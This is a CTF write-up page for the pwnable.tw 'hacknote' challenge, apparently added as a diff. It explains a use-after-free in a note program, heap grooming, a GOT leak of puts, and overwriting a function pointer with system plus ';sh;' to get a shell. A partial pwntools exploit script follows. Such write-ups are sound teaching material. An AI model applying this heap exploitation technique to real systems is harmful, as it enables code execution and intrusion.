@@ -1,0 +1,437 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+<meta content="pwnable.tw - hacknote" property="og:title"/>
+<meta content="article" property="og:type"/>
+<meta content="2020-01-12T19:40:43.176Z" property="og:published_time"/>
+<meta content="2020-03-23T05:57:18.669Z" property="og:modified_time"/>
+<meta content="Srikavin Ramkumar" property="og:author"/>
+<meta content="ctf-writeups" property="og:section"/>
+<meta content="pwnable.tw" property="og:tag"/>
+<meta content="binary-exploitation" property="og:tag"/>
+<meta content="heap-exploitation" property="og:tag"/>
+<meta content="use-after-free" property="og:tag"/>
+<meta content="pwntools" property="og:tag"/>
+<meta content="/posts/pwnable-tw-hacknote/" property="og:url"/>
+
+    <title>pwnable.tw - hacknote - srikavin.me</title>
+    <link rel="stylesheet" href="/bundle.css">
+</head>
+
+<body>
+<nav>
+    <div class="nav-left">
+        <span>
+            <a href="https://srikavin.me" class="name">Srikavin Ramkumar</a>
+        </span>
+        <span>
+            <a href="/posts" class="nav-link">Posts</a>
+        </span>
+        <span>
+            <a class="nav-link" href="/tags">Tags</a>
+        </span>
+    </div>
+</nav>
+<section class="section">
+    <div class="container">
+        
+
+<div class="blog-container">
+    
+
+
+<div class="blog-header">
+    <h1 class="title">
+        
+        pwnable.tw - hacknote
+        
+    </h1>
+    <div class="subtitle">
+                    <span>Posted on
+                        <span class="date" title="Created: 2020-01-12T19:40:43.176Z&#10;Updated: 2020-03-23T05:57:18.669Z">January 12, 2020*
+                        </span>
+
+                        in ctf-writeups
+                        
+                </span>
+    </div>
+    <div class="tags">
+        
+        
+        <a href="&#x2F;tags&#x2F;pwnable-tw&#x2F;"><span class="tag minimal interactive">pwnable.tw</span></a>
+        
+        
+        <a href="&#x2F;tags&#x2F;binary-exploitation&#x2F;"><span class="tag minimal interactive">binary-exploitation</span></a>
+        
+        
+        <a href="&#x2F;tags&#x2F;heap-exploitation&#x2F;"><span class="tag minimal interactive">heap-exploitation</span></a>
+        
+        
+        <a href="&#x2F;tags&#x2F;use-after-free&#x2F;"><span class="tag minimal interactive">use-after-free</span></a>
+        
+        
+        <a href="&#x2F;tags&#x2F;pwntools&#x2F;"><span class="tag minimal interactive">pwntools</span></a>
+        
+    </div>
+</div>
+
+
+<div class="blog-content light">
+    <div class="blog-scrollspy">
+        <h1 class="scrollspy-label">Table of Contents</h1>
+        <ul>
+            
+            <li>
+                <a data-target="challenge" href="#challenge">Challenge</a>
+                
+            </li>
+            
+            <li>
+                <a data-target="solution" href="#solution">Solution</a>
+                
+                <ul>
+                    
+                    <li>
+                        <a data-target="understanding-the-binary" href="#understanding-the-binary">Understanding the binary</a>
+                        
+                    </li>
+                    
+                    <li>
+                        <a data-target="leaking-a-libc-address" href="#leaking-a-libc-address">Leaking a libc address</a>
+                        
+                    </li>
+                    
+                    <li>
+                        <a data-target="crafting-a-shell" href="#crafting-a-shell">Crafting a shell</a>
+                        
+                    </li>
+                    
+                    <li>
+                        <a data-target="script" href="#script">Script</a>
+                        
+                    </li>
+                    
+                </ul>
+                
+            </li>
+            
+        </ul>
+    </div>
+
+    <h1 id="challenge">Challenge</h1>
+<blockquote>
+<p>A good Hacker should always take good notes!</p>
+<p><code>nc chall.pwnable.tw 10102</code></p>
+</blockquote>
+<p>We are also provided a binary and the libc used on the server.</p>
+<h1 id="solution">Solution</h1>
+<p>When running the binary, we can see four options:</p>
+<p><img src="/posts/pwnable-tw-hacknote/5d07df70508cb0091260f634.png" alt="" /></p>
+<h2 id="understanding-the-binary">Understanding the binary</h2>
+<p>When reversing the binary, we can use the shown options to help identify functions used. I reversed the binary in Ghidra, 
+and the following are the cleaned up decompilation output from the binary.</p>
+<span id="continue-reading"></span><pre style="background-color:#ffffff;">
+<code><span style="font-weight:bold;color:#a71d5d;">void </span><span style="font-weight:bold;color:#795da3;">add_note</span><span style="color:#323232;">(</span><span style="font-weight:bold;color:#a71d5d;">void</span><span style="color:#323232;">)
+{
+  </span><span style="font-weight:bold;color:#a71d5d;">int</span><span style="color:#323232;"> iVar1;
+  </span><span style="font-weight:bold;color:#a71d5d;">void *</span><span style="color:#323232;">_note;
+  </span><span style="color:#0086b3;">size_t</span><span style="color:#323232;"> size;
+  </span><span style="font-weight:bold;color:#a71d5d;">void *</span><span style="color:#323232;">contents;
+  </span><span style="font-weight:bold;color:#a71d5d;">int</span><span style="color:#323232;"> in_GS_OFFSET;
+  </span><span style="font-weight:bold;color:#a71d5d;">int</span><span style="color:#323232;"> i;
+  </span><span style="font-weight:bold;color:#a71d5d;">char</span><span style="color:#323232;"> note_size [</span><span style="color:#0086b3;">8</span><span style="color:#323232;">];
+  note </span><span style="font-weight:bold;color:#a71d5d;">*</span><span style="color:#323232;">note;
+  
+  iVar1 </span><span style="font-weight:bold;color:#a71d5d;">= *</span><span style="color:#323232;">(</span><span style="font-weight:bold;color:#a71d5d;">int *</span><span style="color:#323232;">)(in_GS_OFFSET </span><span style="font-weight:bold;color:#a71d5d;">+ </span><span style="color:#0086b3;">0x14</span><span style="color:#323232;">);
+  </span><span style="font-weight:bold;color:#a71d5d;">if </span><span style="color:#323232;">(counter </span><span style="font-weight:bold;color:#a71d5d;">&lt; </span><span style="color:#0086b3;">6</span><span style="color:#323232;">) {
+    i </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#0086b3;">0</span><span style="color:#323232;">;
+    </span><span style="font-weight:bold;color:#a71d5d;">while </span><span style="color:#323232;">(i </span><span style="font-weight:bold;color:#a71d5d;">&lt; </span><span style="color:#0086b3;">5</span><span style="color:#323232;">) {
+      </span><span style="font-weight:bold;color:#a71d5d;">if </span><span style="color:#323232;">((</span><span style="font-weight:bold;color:#a71d5d;">&amp;</span><span style="color:#323232;">notes_list)[i] </span><span style="font-weight:bold;color:#a71d5d;">== </span><span style="color:#323232;">(note </span><span style="font-weight:bold;color:#a71d5d;">*</span><span style="color:#323232;">)</span><span style="color:#0086b3;">0x0</span><span style="color:#323232;">) {
+        _note </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#62a35c;">malloc</span><span style="color:#323232;">(</span><span style="color:#0086b3;">8</span><span style="color:#323232;">);
+        (</span><span style="font-weight:bold;color:#a71d5d;">&amp;</span><span style="color:#323232;">notes_list)[i] </span><span style="font-weight:bold;color:#a71d5d;">=</span><span style="color:#323232;"> _note;
+        </span><span style="font-weight:bold;color:#a71d5d;">if </span><span style="color:#323232;">((</span><span style="font-weight:bold;color:#a71d5d;">&amp;</span><span style="color:#323232;">notes_list)[i] </span><span style="font-weight:bold;color:#a71d5d;">== </span><span style="color:#323232;">(note </span><span style="font-weight:bold;color:#a71d5d;">*</span><span style="color:#323232;">)</span><span style="color:#0086b3;">0x0</span><span style="color:#323232;">) {
+          </span><span style="color:#62a35c;">puts</span><span style="color:#323232;">(</span><span style="color:#183691;">&quot;Alloca Error&quot;</span><span style="color:#323232;">);
+                    </span><span style="font-style:italic;color:#969896;">/* WARNING: Subroutine does not return */
+          </span><span style="color:#62a35c;">exit</span><span style="color:#323232;">(</span><span style="font-weight:bold;color:#a71d5d;">-</span><span style="color:#0086b3;">1</span><span style="color:#323232;">);
+        }
+        (</span><span style="font-weight:bold;color:#a71d5d;">&amp;</span><span style="color:#323232;">notes_list)[i]-&gt;print_func </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#323232;">(</span><span style="font-weight:bold;color:#a71d5d;">void *</span><span style="color:#323232;">)</span><span style="color:#0086b3;">0x804862b</span><span style="color:#323232;">;
+        </span><span style="color:#62a35c;">printf</span><span style="color:#323232;">(</span><span style="color:#183691;">&quot;Note size :&quot;</span><span style="color:#323232;">);
+        read(</span><span style="color:#0086b3;">0</span><span style="color:#323232;">,note_size,</span><span style="color:#0086b3;">8</span><span style="color:#323232;">);
+        size </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#62a35c;">atoi</span><span style="color:#323232;">(note_size);
+        note </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#323232;">(</span><span style="font-weight:bold;color:#a71d5d;">&amp;</span><span style="color:#323232;">notes_list)[i];
+        contents </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#62a35c;">malloc</span><span style="color:#323232;">(size);
+        note-&gt;contents </span><span style="font-weight:bold;color:#a71d5d;">=</span><span style="color:#323232;"> contents;
+        </span><span style="font-weight:bold;color:#a71d5d;">if </span><span style="color:#323232;">((</span><span style="font-weight:bold;color:#a71d5d;">&amp;</span><span style="color:#323232;">notes_list)[i]-&gt;contents </span><span style="font-weight:bold;color:#a71d5d;">== </span><span style="color:#323232;">(</span><span style="font-weight:bold;color:#a71d5d;">char *</span><span style="color:#323232;">)</span><span style="color:#0086b3;">0x0</span><span style="color:#323232;">) {
+          </span><span style="color:#62a35c;">puts</span><span style="color:#323232;">(</span><span style="color:#183691;">&quot;Alloca Error&quot;</span><span style="color:#323232;">);
+                    </span><span style="font-style:italic;color:#969896;">/* WARNING: Subroutine does not return */
+          </span><span style="color:#62a35c;">exit</span><span style="color:#323232;">(</span><span style="font-weight:bold;color:#a71d5d;">-</span><span style="color:#0086b3;">1</span><span style="color:#323232;">);
+        }
+        </span><span style="color:#62a35c;">printf</span><span style="color:#323232;">(</span><span style="color:#183691;">&quot;Content :&quot;</span><span style="color:#323232;">);
+        read(</span><span style="color:#0086b3;">0</span><span style="color:#323232;">,(</span><span style="font-weight:bold;color:#a71d5d;">&amp;</span><span style="color:#323232;">notes_list)[i]-&gt;contents,size);
+        </span><span style="color:#62a35c;">puts</span><span style="color:#323232;">(</span><span style="color:#183691;">&quot;Success !&quot;</span><span style="color:#323232;">);
+        counter </span><span style="font-weight:bold;color:#a71d5d;">=</span><span style="color:#323232;"> counter </span><span style="font-weight:bold;color:#a71d5d;">+ </span><span style="color:#0086b3;">1</span><span style="color:#323232;">;
+        </span><span style="font-weight:bold;color:#a71d5d;">break</span><span style="color:#323232;">;
+      }
+      i </span><span style="font-weight:bold;color:#a71d5d;">=</span><span style="color:#323232;"> i </span><span style="font-weight:bold;color:#a71d5d;">+ </span><span style="color:#0086b3;">1</span><span style="color:#323232;">;
+    }
+  }
+  </span><span style="font-weight:bold;color:#a71d5d;">else </span><span style="color:#323232;">{
+    </span><span style="color:#62a35c;">puts</span><span style="color:#323232;">(</span><span style="color:#183691;">&quot;Full&quot;</span><span style="color:#323232;">);
+  }
+  </span><span style="font-weight:bold;color:#a71d5d;">if </span><span style="color:#323232;">(iVar1 </span><span style="font-weight:bold;color:#a71d5d;">!= *</span><span style="color:#323232;">(</span><span style="font-weight:bold;color:#a71d5d;">int *</span><span style="color:#323232;">)(in_GS_OFFSET </span><span style="font-weight:bold;color:#a71d5d;">+ </span><span style="color:#0086b3;">0x14</span><span style="color:#323232;">)) {
+                    </span><span style="font-style:italic;color:#969896;">/* WARNING: Subroutine does not return */
+    </span><span style="color:#323232;">__stack_chk_fail();
+  }
+  </span><span style="font-weight:bold;color:#a71d5d;">return</span><span style="color:#323232;">;
+}
+</span></code></pre>
+<p>In the <code>add_note</code> function, we can see that there is a list of notes, called <code>notes_list</code>, and a maximum number of notes allowed. After 6 notes, are created, no more can be created. The <code>note</code> struct contains a pointer to a function at <code>0x804862b</code> and a pointer to <code>malloc</code>ed memory containing the provided contents. There are no obvious heap overflows.</p>
+<pre style="background-color:#ffffff;">
+<code><span style="font-weight:bold;color:#a71d5d;">void </span><span style="font-weight:bold;color:#795da3;">print_func</span><span style="color:#323232;">(</span><span style="font-weight:bold;color:#a71d5d;">char **</span><span style="color:#323232;">param_1)
+
+{
+  </span><span style="color:#62a35c;">puts</span><span style="color:#323232;">(param_1[</span><span style="color:#0086b3;">1</span><span style="color:#323232;">]);
+  </span><span style="font-weight:bold;color:#a71d5d;">return</span><span style="color:#323232;">;
+}
+</span></code></pre>
+<p>This is the function at <code>0x804862b</code>. It simply prints the contents of the note.</p>
+<pre style="background-color:#ffffff;">
+<code><span style="font-weight:bold;color:#a71d5d;">void </span><span style="font-weight:bold;color:#795da3;">delete_note</span><span style="color:#323232;">(</span><span style="font-weight:bold;color:#a71d5d;">void</span><span style="color:#323232;">)
+{
+  </span><span style="font-weight:bold;color:#a71d5d;">int</span><span style="color:#323232;"> iVar1;
+  </span><span style="font-weight:bold;color:#a71d5d;">int</span><span style="color:#323232;"> index;
+  </span><span style="font-weight:bold;color:#a71d5d;">int</span><span style="color:#323232;"> in_GS_OFFSET;
+  </span><span style="font-weight:bold;color:#a71d5d;">char</span><span style="color:#323232;"> index_str [</span><span style="color:#0086b3;">4</span><span style="color:#323232;">];
+  
+  iVar1 </span><span style="font-weight:bold;color:#a71d5d;">= *</span><span style="color:#323232;">(</span><span style="font-weight:bold;color:#a71d5d;">int *</span><span style="color:#323232;">)(in_GS_OFFSET </span><span style="font-weight:bold;color:#a71d5d;">+ </span><span style="color:#0086b3;">0x14</span><span style="color:#323232;">);
+  </span><span style="color:#62a35c;">printf</span><span style="color:#323232;">(</span><span style="color:#183691;">&quot;Index :&quot;</span><span style="color:#323232;">);
+  read(</span><span style="color:#0086b3;">0</span><span style="color:#323232;">,index_str,</span><span style="color:#0086b3;">4</span><span style="color:#323232;">);
+  index </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#62a35c;">atoi</span><span style="color:#323232;">(index_str);
+  </span><span style="font-weight:bold;color:#a71d5d;">if </span><span style="color:#323232;">((index </span><span style="font-weight:bold;color:#a71d5d;">&lt; </span><span style="color:#0086b3;">0</span><span style="color:#323232;">) </span><span style="font-weight:bold;color:#a71d5d;">|| </span><span style="color:#323232;">(counter </span><span style="font-weight:bold;color:#a71d5d;">&lt;=</span><span style="color:#323232;"> index)) {
+    </span><span style="color:#62a35c;">puts</span><span style="color:#323232;">(</span><span style="color:#183691;">&quot;Out of bound!&quot;</span><span style="color:#323232;">);
+                    </span><span style="font-style:italic;color:#969896;">/* WARNING: Subroutine does not return */
+    </span><span style="color:#323232;">_exit(</span><span style="color:#0086b3;">0</span><span style="color:#323232;">);
+  }
+  </span><span style="font-weight:bold;color:#a71d5d;">if </span><span style="color:#323232;">((</span><span style="font-weight:bold;color:#a71d5d;">&amp;</span><span style="color:#323232;">notes_list)[index] </span><span style="font-weight:bold;color:#a71d5d;">!= </span><span style="color:#323232;">(note </span><span style="font-weight:bold;color:#a71d5d;">*</span><span style="color:#323232;">)</span><span style="color:#0086b3;">0x0</span><span style="color:#323232;">) {
+    </span><span style="color:#62a35c;">free</span><span style="color:#323232;">((</span><span style="font-weight:bold;color:#a71d5d;">&amp;</span><span style="color:#323232;">notes_list)[index]-&gt;contents);
+    </span><span style="color:#62a35c;">free</span><span style="color:#323232;">((</span><span style="font-weight:bold;color:#a71d5d;">&amp;</span><span style="color:#323232;">notes_list)[index]);
+    </span><span style="color:#62a35c;">puts</span><span style="color:#323232;">(</span><span style="color:#183691;">&quot;Success&quot;</span><span style="color:#323232;">);
+  }
+  </span><span style="font-weight:bold;color:#a71d5d;">if </span><span style="color:#323232;">(iVar1 </span><span style="font-weight:bold;color:#a71d5d;">!= *</span><span style="color:#323232;">(</span><span style="font-weight:bold;color:#a71d5d;">int *</span><span style="color:#323232;">)(in_GS_OFFSET </span><span style="font-weight:bold;color:#a71d5d;">+ </span><span style="color:#0086b3;">0x14</span><span style="color:#323232;">)) {
+                    </span><span style="font-style:italic;color:#969896;">/* WARNING: Subroutine does not return */
+    </span><span style="color:#323232;">__stack_chk_fail();
+  }
+  </span><span style="font-weight:bold;color:#a71d5d;">return</span><span style="color:#323232;">;
+}
+</span></code></pre>
+<p>The <code>delete_note</code>function has an obvious oversight. It doesn't remove the deleted note from the <code>notes_list</code> array. It simply frees the memory that was allocated. </p>
+<pre style="background-color:#ffffff;">
+<code><span style="font-weight:bold;color:#a71d5d;">void </span><span style="font-weight:bold;color:#795da3;">print_note</span><span style="color:#323232;">(</span><span style="font-weight:bold;color:#a71d5d;">void</span><span style="color:#323232;">)
+{
+  </span><span style="font-weight:bold;color:#a71d5d;">int</span><span style="color:#323232;"> index;
+  </span><span style="font-weight:bold;color:#a71d5d;">int</span><span style="color:#323232;"> _canary;
+  </span><span style="font-weight:bold;color:#a71d5d;">char</span><span style="color:#323232;"> index_str [</span><span style="color:#0086b3;">4</span><span style="color:#323232;">];
+  </span><span style="font-weight:bold;color:#a71d5d;">int</span><span style="color:#323232;"> canary;
+  
+  canary </span><span style="font-weight:bold;color:#a71d5d;">= *</span><span style="color:#323232;">(</span><span style="font-weight:bold;color:#a71d5d;">int *</span><span style="color:#323232;">)(_canary </span><span style="font-weight:bold;color:#a71d5d;">+ </span><span style="color:#0086b3;">0x14</span><span style="color:#323232;">);
+  </span><span style="color:#62a35c;">printf</span><span style="color:#323232;">(</span><span style="color:#183691;">&quot;Index :&quot;</span><span style="color:#323232;">);
+  read(</span><span style="color:#0086b3;">0</span><span style="color:#323232;">,index_str,</span><span style="color:#0086b3;">4</span><span style="color:#323232;">);
+  index </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#62a35c;">atoi</span><span style="color:#323232;">(index_str);
+  </span><span style="font-weight:bold;color:#a71d5d;">if </span><span style="color:#323232;">((index </span><span style="font-weight:bold;color:#a71d5d;">&lt; </span><span style="color:#0086b3;">0</span><span style="color:#323232;">) </span><span style="font-weight:bold;color:#a71d5d;">|| </span><span style="color:#323232;">(counter </span><span style="font-weight:bold;color:#a71d5d;">&lt;=</span><span style="color:#323232;"> index)) {
+    </span><span style="color:#62a35c;">puts</span><span style="color:#323232;">(</span><span style="color:#183691;">&quot;Out of bound!&quot;</span><span style="color:#323232;">);
+                    </span><span style="font-style:italic;color:#969896;">/* WARNING: Subroutine does not return */
+    </span><span style="color:#323232;">_exit(</span><span style="color:#0086b3;">0</span><span style="color:#323232;">);
+  }
+  </span><span style="font-weight:bold;color:#a71d5d;">if </span><span style="color:#323232;">((</span><span style="font-weight:bold;color:#a71d5d;">&amp;</span><span style="color:#323232;">notes_list)[index] </span><span style="font-weight:bold;color:#a71d5d;">!= </span><span style="color:#323232;">(note </span><span style="font-weight:bold;color:#a71d5d;">*</span><span style="color:#323232;">)</span><span style="color:#0086b3;">0x0</span><span style="color:#323232;">) {
+    (</span><span style="font-weight:bold;color:#a71d5d;">*</span><span style="color:#323232;">(code </span><span style="font-weight:bold;color:#a71d5d;">*</span><span style="color:#323232;">)(</span><span style="font-weight:bold;color:#a71d5d;">&amp;</span><span style="color:#323232;">notes_list)[index]-&gt;print_func)((</span><span style="font-weight:bold;color:#a71d5d;">&amp;</span><span style="color:#323232;">notes_list)[index]);
+  }
+  </span><span style="font-weight:bold;color:#a71d5d;">if </span><span style="color:#323232;">(canary </span><span style="font-weight:bold;color:#a71d5d;">!= *</span><span style="color:#323232;">(</span><span style="font-weight:bold;color:#a71d5d;">int *</span><span style="color:#323232;">)(_canary </span><span style="font-weight:bold;color:#a71d5d;">+ </span><span style="color:#0086b3;">0x14</span><span style="color:#323232;">)) {
+                    </span><span style="font-style:italic;color:#969896;">/* WARNING: Subroutine does not return */
+    </span><span style="color:#323232;">__stack_chk_fail();
+  }
+  </span><span style="font-weight:bold;color:#a71d5d;">return</span><span style="color:#323232;">;
+}
+</span></code></pre>
+<p>The <code>print_note</code> function calls the function that was stored within the <code>note</code> struct with a pointer to the struct itself.</p>
+<p> </p>
+<p>The goal is clear. If we overwrite <code>note-&gt;print_func</code> with a pointer to <code>system</code> and call <code>print_note</code> on that index, 
+we can get a shell. To do this, we need to leak a libc address. </p>
+<h2 id="leaking-a-libc-address">Leaking a libc address</h2>
+<p>To leak a libc address, we can simply print the contents of a global-offset-table (GOT) entry. The GOT contains pointers 
+to dynamically-linked libraries, and is populated by the linker at runtime. The GOT entry for <code>puts</code> would point to the address of <code>puts</code> within libc. </p>
+<p> </p>
+<p>To accomplish this, we can abuse the use-after-free to overwrite a freed <code>note</code> struct. The goal is to make a <code>note</code> 
+struct look like the following:</p>
+<pre style="background-color:#ffffff;">
+<code><span style="color:#323232;">note-&gt;print_func </span><span style="font-weight:bold;color:#a71d5d;">= *</span><span style="color:#0086b3;">0x804862b</span><span style="color:#323232;">;  </span><span style="font-style:italic;color:#969896;">// Address of the default print_func used by the binary
+</span><span style="color:#323232;">note-&gt;contents </span><span style="font-weight:bold;color:#a71d5d;">= *</span><span style="color:#0086b3;">0x804a024</span><span style="color:#323232;">;    </span><span style="font-style:italic;color:#969896;">// Address of GOT entry for puts
+</span></code></pre>
+<p><code>malloc</code> returns the first available memory region, and generally reuses previously <code>free</code>ed regions. However, it has 
+bins of specific sizes that generally are not moved. To demonstrate this, I made a small <a href="https://repl.it/repls/PaltryTrustyBrace">test program</a>:</p>
+<iframe allowfullscreen="true" allowtransparency="true" frameborder="no" height="800px"
+        sandbox="allow-forms allow-pointer-lock allow-popups allow-same-origin allow-scripts allow-modals"
+        scrolling="no" src="https://repl.it/repls/PaltryTrustyBrace?lite=true" width="100%"></iframe>
+<p>The <code>note</code> struct malloc 8 bytes for the struct, and n bytes for the contents. If we allocate 2 notes with 8 bytes of 
+contents each, and then free them, we can gain a pointer to the <code>note</code> struct. </p>
+<pre style="background-color:#ffffff;">
+<code><span style="font-style:italic;color:#969896;">// New note with 8 bytes content (Note A)
+</span><span style="color:#323232;">malloc(</span><span style="color:#0086b3;">8</span><span style="color:#323232;">);  </span><span style="font-style:italic;color:#969896;">// = 0x00 Note A struct
+</span><span style="color:#323232;">malloc(</span><span style="color:#0086b3;">8</span><span style="color:#323232;">);  </span><span style="font-style:italic;color:#969896;">// = 0x10 Note A contents
+// New note with 8 bytes content (Note B)
+</span><span style="color:#323232;">malloc(</span><span style="color:#0086b3;">8</span><span style="color:#323232;">);  </span><span style="font-style:italic;color:#969896;">// = 0x20 Note B struct
+</span><span style="color:#323232;">malloc(</span><span style="color:#0086b3;">8</span><span style="color:#323232;">);  </span><span style="font-style:italic;color:#969896;">// = 0x30 Note B contents
+// Delete note A
+</span><span style="color:#323232;">free(</span><span style="color:#0086b3;">0x00</span><span style="color:#323232;">);
+free(</span><span style="color:#0086b3;">0x10</span><span style="color:#323232;">);
+</span><span style="font-style:italic;color:#969896;">// Delete note B
+</span><span style="color:#323232;">free(</span><span style="color:#0086b3;">0x20</span><span style="color:#323232;">);
+free(</span><span style="color:#0086b3;">0x30</span><span style="color:#323232;">);
+</span><span style="font-style:italic;color:#969896;">// New note with 32 bytes contents (Note C)
+</span><span style="color:#323232;">malloc(</span><span style="color:#0086b3;">8</span><span style="color:#323232;">);  </span><span style="font-style:italic;color:#969896;">// = 0x00 Note C struct  &lt;-&gt; Note A struct
+</span><span style="color:#323232;">malloc(</span><span style="color:#0086b3;">32</span><span style="color:#323232;">); </span><span style="font-style:italic;color:#969896;">// = 0xA0 - This will be in a different bin from the smaller allocations
+// New note with 8 bytes contents (Note D)
+</span><span style="color:#323232;">malloc(</span><span style="color:#0086b3;">8</span><span style="color:#323232;">);  </span><span style="font-style:italic;color:#969896;">// = 0x10 Note D struct   &lt;- Note A contents
+</span><span style="color:#323232;">malloc(</span><span style="color:#0086b3;">8</span><span style="color:#323232;">);  </span><span style="font-style:italic;color:#969896;">// = 0x20 Note D contents -&gt; Note B struct
+</span></code></pre>
+<p>Note D's contents will overwrite Note B's struct. Now we can simply set the contents of Note D to the needed values, and 
+the print out index 1 to leak the libc address of <code>puts</code>. To find the libc base address, we can subtract the address of 
+puts in the libc binary from the leaked address. Now we can find the address of any libc function. </p>
+<pre style="background-color:#ffffff;">
+<code><span style="color:#0086b3;">LIBC_BASE </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#0086b3;">LEAKED_ADDR </span><span style="font-weight:bold;color:#a71d5d;">- </span><span style="color:#0086b3;">L_ADDR_PUTS
+ADDR_SYSTEM </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#0086b3;">LIBC_BASE </span><span style="font-weight:bold;color:#a71d5d;">+ </span><span style="color:#0086b3;">L_ADDR_SYSTEM
+</span></code></pre><h2 id="crafting-a-shell">Crafting a shell</h2>
+<p>To spawn a shell, we need a <code>note</code>'s struct to look like the following:</p>
+<pre style="background-color:#ffffff;">
+<code><span style="color:#323232;">note-&gt;print_func </span><span style="font-weight:bold;color:#a71d5d;">= *</span><span style="color:#323232;">system;     </span><span style="font-style:italic;color:#969896;">// Address of system calculated from the leaked base address
+</span><span style="color:#323232;">note-&gt;contents </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#183691;">&quot;;sh;&quot;</span><span style="color:#323232;">;        </span><span style="font-style:italic;color:#969896;">// String to call /bin/sh
+</span></code></pre>
+<p>Since <code>print_note</code> calls <code>note-&gt;print_func</code> with a pointer to the note itself, this will call <code>system('\x90\xd0\xab\xff;sh;\xff')</code>. 
+The address of system itself will be provided as an argument. To still get a shell, we can surround <code>sh</code> with semi-colons 
+to make them appear as separate commands to the shell. </p>
+<p> </p>
+<p>We can reuse the setup we used to leak libc. If we just free the last note created (Note D), then we can create another 
+note that will also overwrite Note B's struct:</p>
+<pre style="background-color:#ffffff;">
+<code><span style="font-style:italic;color:#969896;">//...
+// New note with 8 bytes contents (Note D)
+</span><span style="color:#323232;">malloc(</span><span style="color:#0086b3;">8</span><span style="color:#323232;">);  </span><span style="font-style:italic;color:#969896;">// = 0x10 Note D struct   &lt;- Note A contents
+</span><span style="color:#323232;">malloc(</span><span style="color:#0086b3;">8</span><span style="color:#323232;">);  </span><span style="font-style:italic;color:#969896;">// = 0x20 Note D contents -&gt; Note B struct
+// Delete Note D
+</span><span style="color:#323232;">free(</span><span style="color:#0086b3;">0x10</span><span style="color:#323232;">);
+free(</span><span style="color:#0086b3;">0x20</span><span style="color:#323232;">);
+</span><span style="font-style:italic;color:#969896;">// New note with 8 bytes contents (Note E)
+</span><span style="color:#323232;">malloc(</span><span style="color:#0086b3;">8</span><span style="color:#323232;">);  </span><span style="font-style:italic;color:#969896;">// = 0x10 Note E struct &lt;-&gt; Note D struct   &lt;-&gt; Note A contents
+</span><span style="color:#323232;">malloc(</span><span style="color:#0086b3;">8</span><span style="color:#323232;">);  </span><span style="font-style:italic;color:#969896;">// = 0x20 Note E struct &lt;-&gt; Note D contents &lt;-&gt; Note B struct
+</span></code></pre>
+<p>Now, if we print the note at index 1, we will get a shell.</p>
+<h2 id="script">Script</h2>
+<pre style="background-color:#ffffff;">
+<code><span style="font-weight:bold;color:#a71d5d;">from </span><span style="color:#323232;">pwn </span><span style="font-weight:bold;color:#a71d5d;">import </span><span style="color:#0086b3;">*
+
+</span><span style="color:#323232;">context.terminal </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#183691;">&#39;/bin/sh&#39;
+
+</span><span style="color:#323232;">r </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#323232;">remote(</span><span style="color:#183691;">&#39;chall.pwnable.tw&#39;</span><span style="color:#323232;">, </span><span style="color:#0086b3;">10102</span><span style="color:#323232;">)
+libc </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#323232;">ELF(</span><span style="color:#183691;">&#39;./libc_32.so.6&#39;</span><span style="color:#323232;">)
+elf </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#323232;">ELF(</span><span style="color:#183691;">&#39;./hacknote&#39;</span><span style="color:#323232;">)
+
+</span><span style="color:#0086b3;">L_ADDR_SYSTEM </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#323232;">libc.symbols[</span><span style="color:#183691;">&#39;system&#39;</span><span style="color:#323232;">]
+</span><span style="color:#0086b3;">L_ADDR_PUTS </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#323232;">libc.symbols[</span><span style="color:#183691;">&#39;puts&#39;</span><span style="color:#323232;">]
+
+</span><span style="color:#0086b3;">ADDR_PUTS_GOT </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#323232;">elf.got[</span><span style="color:#183691;">&#39;puts&#39;</span><span style="color:#323232;">]
+</span><span style="color:#0086b3;">ADDR_PRINT_FUNC </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#0086b3;">0x804862b
+
+
+</span><span style="font-weight:bold;color:#a71d5d;">def </span><span style="font-weight:bold;color:#323232;">add_note</span><span style="color:#323232;">(size, contents):
+    log.info(</span><span style="color:#183691;">&#39;Adding note: [size]: </span><span style="color:#0086b3;">%d</span><span style="color:#183691;">  [contents]: </span><span style="color:#0086b3;">%s</span><span style="color:#183691;">&#39; </span><span style="font-weight:bold;color:#a71d5d;">% </span><span style="color:#323232;">(size, contents))
+    r.write(</span><span style="color:#183691;">&#39;1</span><span style="color:#0086b3;">\n</span><span style="color:#183691;">&#39;</span><span style="color:#323232;">)
+    r.recvuntil(</span><span style="color:#183691;">&#39;Note size :&#39;</span><span style="color:#323232;">)
+    r.write(</span><span style="color:#0086b3;">str</span><span style="color:#323232;">(size))
+    r.recvuntil(</span><span style="color:#183691;">&#39;Content :&#39;</span><span style="color:#323232;">)
+    r.write(contents)
+    r.recvuntil(</span><span style="color:#183691;">&#39;Success !</span><span style="color:#0086b3;">\n</span><span style="color:#183691;">&#39;</span><span style="color:#323232;">)
+    skip_menu()
+
+
+</span><span style="font-weight:bold;color:#a71d5d;">def </span><span style="font-weight:bold;color:#323232;">delete_note</span><span style="color:#323232;">(index):
+    r.write(</span><span style="color:#183691;">&#39;2&#39;</span><span style="color:#323232;">)
+    r.recvuntil(</span><span style="color:#183691;">&#39;Index :&#39;</span><span style="color:#323232;">)
+    r.write(</span><span style="color:#0086b3;">str</span><span style="color:#323232;">(index))
+    r.recvuntil(</span><span style="color:#183691;">&#39;Success&#39;</span><span style="color:#323232;">)
+    skip_menu()
+
+
